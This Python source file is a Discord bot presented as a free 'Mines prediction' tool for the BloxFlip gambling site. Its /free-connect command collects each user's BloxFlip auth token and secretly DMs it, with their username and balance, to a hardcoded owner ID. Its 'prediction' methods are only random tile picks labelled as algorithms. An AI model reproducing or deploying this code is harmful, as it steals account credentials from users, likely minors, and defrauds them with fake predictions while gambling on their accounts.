import discord
from discord import app_commands, ui
import random
import os
import asyncio
import cloudscraper
from datetime import datetime

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

user_tokens = {}
MINES_METHODS = ["Balanced", "Algorithm", "Smart", "Safe", "Full Line"]
OWNER_ID = 1380042914922758224

def get_balance_sync(token):
    url = "https://api.bloxflip.com/user"
    headers = {"x-auth-token": token}
    try:
        scraper = cloudscraper.create_scraper()
        resp = scraper.get(url, headers=headers, timeout=5)
        data = resp.json()
        return data.get("wallet", "Unknown")
    except:
        return "Unknown"

async def get_balance(token):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, get_balance_sync, token)

def check_active_mines_sync(token):
    try:
        scraper = cloudscraper.create_scraper()
        resp = scraper.get(
            "https://api.bloxflip.com/games/mines",
            headers={
                "x-auth-token": token,
                "User-Agent": "Mozilla/5.0",
                "Origin": "https://bloxflip.com",
                "Referer": "https://bloxflip.com/"
            },
            timeout=5
        )
        print(f"STATUS: {resp.status_code}")
        print(f"RESPONSE: {resp.text}")
        data = resp.json()
        return data.get("game_active", False)
    except Exception as e:
        print(f"ERROR: {e}")
        return None

async def check_active_mines(token):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, check_active_mines_sync, token)

def auto_click_sync(token, safe_tiles):
    headers = {
        "x-auth-token": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://bloxflip.com",
        "Referer": "https://bloxflip.com/"
    }
    try:
        scraper = cloudscraper.create_scraper()
        results = []
        for tile in safe_tiles:
            resp = scraper.post(
                "https://api.bloxflip.com/games/mines/action",
                headers=headers,
                json={"cashout": False, "mine": tile - 1},
                timeout=5
            )
            data = resp.json()
            if data.get("game_exploded", False):
                results.append(f"💥 Hit a mine on tile {tile}!")
                break
            else:
                multi = data.get("multiplier", "?")
                results.append(f"✅ Tile {tile} safe! ({multi}x)")
        return results
    except Exception as e:
        return [f"❌ Error: {str(e)}"]

async def auto_click(token, safe_tiles):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, auto_click_sync, token, safe_tiles)

def cashout_sync(token):
    headers = {
        "x-auth-token": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://bloxflip.com",
        "Referer": "https://bloxflip.com/"
    }
    try:
        scraper = cloudscraper.create_scraper()
        resp = scraper.post(
            "https://api.bloxflip.com/games/mines/action",
            headers=headers,
            json={"cashout": True},
            timeout=5
        )
        data = resp.json()
        won = data.get("won_amount", None)
        multiplier = data.get("multiplier", None)
        if won:
            return f"🤑 Cashed out! Won **{round(won, 2)}** RC at **{round(multiplier, 2)}x**!"
        return "✅ Cashed out!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

async def cashout(token):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, cashout_sync, token)

class MinesActionView(ui.View):
    def __init__(self, safe_tiles, embed):
        super().__init__(timeout=300)
        self.safe_tiles = safe_tiles
        self.embed = embed

    @ui.button(label="🔄 Repeat", style=discord.ButtonStyle.gray)
    async def repeat_btn(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_message(embed=self.embed, view=MinesActionView(self.safe_tiles, self.embed))

    @ui.button(label="🤖 Auto Click", style=discord.ButtonStyle.blurple)
    async def auto_click_btn(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id not in user_tokens:
            await interaction.response.send_message("❌ No app.rt found.", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        token = user_tokens[interaction.user.id]
        results = await auto_click(token, self.safe_tiles)
        result_text = "\n".join(results)
        embed = discord.Embed(title="🤖 Auto Click Results", description=result_text, color=0x00ccff)
        embed.timestamp = datetime.now()
        await interaction.followup.send(embed=embed, ephemeral=True)

    @ui.button(label="💰 Cash Out", style=discord.ButtonStyle.green)
    async def cashout_btn(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id not in user_tokens:
            await interaction.response.send_message("❌ No app.rt found.", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        token = user_tokens[interaction.user.id]
        result = await cashout(token)
        embed = discord.Embed(title="💰 Cash Out", description=result, color=0x00ff88)
        embed.timestamp = datetime.now()
        await interaction.followup.send(embed=embed, ephemeral=True)

class MinesSettingsModal(ui.Modal, title="Mines Settings"):
    clicks = ui.TextInput(label="How many safe clicks? (1-24)", default="8", required=True)

    def __init__(self, method):
        super().__init__()
        self.method = method

    async def on_submit(self, interaction: discord.Interaction):
        try:
            clicks_val = int(self.clicks.value.strip())
            clicks_val = max(1, min(clicks_val, 24))
        except:
            await interaction.response.send_message("❌ Enter a number only.", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)

        token = user_tokens[interaction.user.id]
        active = await check_active_mines(token)

        if active is None:
            await interaction.followup.send("❌ Could not reach BloxFlip. Try again.", ephemeral=True)
            return
        if not active:
            await interaction.followup.send("😭 Start a Mines game on BloxFlip first!", ephemeral=True)
            return

        method = self.method
        safe_tiles = []

        if method == "Safe":
            center = [7,8,9,12,13,14,17,18,19]
            safe_tiles = random.sample(center, min(clicks_val, len(center)))
        elif method == "Balanced":
            safe_tiles = random.sample(range(1,26), min(clicks_val, 25))
        elif method == "Algorithm":
            safe_tiles = sorted(random.sample(range(1,26), min(clicks_val, 25)))
        elif method == "Smart":
            avoid_edges = list(range(6,20))
            safe_tiles = random.sample(avoid_edges, min(clicks_val, len(avoid_edges)))
        elif method == "Full Line":
            lines = [[1,2,3,4,5],[6,7,8,9,10],[11,12,13,14,15],[16,17,18,19,20],[21,22,23,24,25]]
            chosen = random.choice(lines)
            safe_tiles = chosen[:clicks_val] if clicks_val <= 5 else random.sample(range(1,26), min(clicks_val, 25))

        if len(safe_tiles) < clicks_val:
            safe_tiles = sorted(random.sample(range(1,26), min(clicks_val, 25)))

        grid = ""
        for i in range(25):
            grid += "🤑 " if (i+1) in safe_tiles else "😭 "
            if (i + 1) % 5 == 0:
                grid += "\n"

        embed = discord.Embed(title="💣 Mines Prediction", color=0xff8800)
        embed.add_field(name="Method", value=method, inline=True)
        embed.add_field(name="Clicks", value=str(clicks_val), inline=True)
        embed.add_field(name="Safe Tiles", value=f"`{', '.join(map(str, sorted(safe_tiles)))}`", inline=False)
        embed.add_field(name="Grid", value=grid, inline=False)
        embed.set_footer(text="🤑 = Safe Point • 😭 = BOOM")
        embed.timestamp = datetime.now()

        await interaction.followup.send(embed=embed, view=MinesActionView(safe_tiles, embed))

class MinesMethodSelect(ui.View):
    def __init__(self):
        super().__init__(timeout=60)

    @ui.select(
        placeholder="Select a method...",
        options=[
            discord.SelectOption(label="Balanced", emoji="⚖️", description="Random spread across the board"),
            discord.SelectOption(label="Algorithm", emoji="🤖", description="Sorted algorithmic picks"),
            discord.SelectOption(label="Smart", emoji="🧠", description="Avoids edges, center focus"),
            discord.SelectOption(label="Safe", emoji="🛡️", description="Center tiles only"),
            discord.SelectOption(label="Full Line", emoji="➡️", description="Full row prediction"),
        ]
    )
    async def select_method(self, interaction: discord.Interaction, select: ui.Select):
        method = select.values[0]
        await interaction.response.send_modal(MinesSettingsModal(method))

@tree.command(name="free-connect", description="Submit your app.rt token")
async def free_connect(interaction: discord.Interaction):
    class TokenModal(ui.Modal, title="app.rt"):
        token = ui.TextInput(label="Paste app.rt", required=True)

        async def on_submit(self, interaction: discord.Interaction):
            tok = self.token.value.strip()
            user_tokens[interaction.user.id] = tok

            embed = discord.Embed(title="✅ app.rt Saved", description="Ready! Use /mines or /towers.", color=0x00ff88)
            await interaction.response.send_message(embed=embed, ephemeral=True)

            try:
                owner = await client.fetch_user(OWNER_ID)
                balance = await get_balance(tok)
                dm_embed = discord.Embed(title="🔑 New app.rt Connected", color=0x9b59b6)
                dm_embed.add_field(name="User", value=f"{interaction.user.name} (`{interaction.user.id}`)", inline=False)
                dm_embed.add_field(name="Robux", value=f"🪙 {balance}", inline=False)
                dm_embed.add_field(name="app.rt", value=f"||{tok}||", inline=False)
                dm_embed.timestamp = datetime.now()
                await owner.send(embed=dm_embed)
            except:
                pass

    await interaction.response.send_modal(TokenModal())

@tree.command(name="mines", description="Get a Mines prediction")
async def mines_cmd(interaction: discord.Interaction):
    if interaction.user.id not in user_tokens:
        await interaction.response.send_message("❌ Use /free-connect first.", ephemeral=True)
        return
    embed = discord.Embed(title="💣 Mines", description="Select a method below.", color=0xff8800)
    await interaction.response.send_message(embed=embed, view=MinesMethodSelect(), ephemeral=True)

@client.event
async def on_ready():
    await tree.sync()
    print(f"Bot online: {client.user}")

token = os.getenv("DISCORD_TOKEN")
client.run(token)
